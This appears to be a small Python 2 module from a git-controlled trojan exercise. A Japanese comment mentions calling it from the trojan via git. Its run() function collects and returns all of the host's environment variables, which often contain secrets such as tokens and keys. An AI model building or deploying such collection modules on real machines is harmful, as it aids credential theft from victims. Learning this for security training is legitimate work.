# -*- coding: utf-8 -*-

import os


def run(**args):

    print "[*] In environment module."

    return str(os.environ)


# git 経由で、trojan から呼び出す場合は、以下はコメントアウト
#environs = run()
#print environs

